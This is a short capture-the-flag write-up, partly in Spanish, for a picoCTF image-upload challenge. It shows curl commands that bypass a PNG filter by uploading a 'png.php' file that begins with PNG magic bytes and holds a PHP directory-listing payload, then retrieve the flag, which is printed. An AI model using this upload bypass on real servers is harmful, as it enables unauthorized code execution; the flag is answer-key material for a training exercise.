
## Descripción
I found a web app that can help process images: PNG images only!

Try it [here](http://atlas.picoctf.net:50203/)!
http://atlas.picoctf.net:50203/
## Solución
```
curl -s http://atlas.picoctf.net:50203/robots.txt

User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/

Leí instructions.txt:

curl -s http://atlas.picoctf.net:50203/instructions.txt

La app validaba que el archivo tuviera .png en el nombre y que los primeros bytes contuvieran PNG.

PNG
<?php foreach(scandir("/var/www/html") as $f){echo $f."\n";} ?>

curl -s -F "file=@trickster-list.png.php;filename=trickster-list.png.php;type=image/png" http://atlas.picoctf.net:50203/

curl -s http://atlas.picoctf.net:50203/uploads/trickster-list.png.php

GAZWIMLEGU2DQ.txt

curl -s http://atlas.picoctf.net:50203/GAZWIMLEGU2DQ.txt

/*  picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222} */

```
## Notas Adicionales
- El filtro era débil porque aceptaba nombres que contenían `.png`, aunque terminaran en `.php`.
## Referencias
http://atlas.picoctf.net:50203/
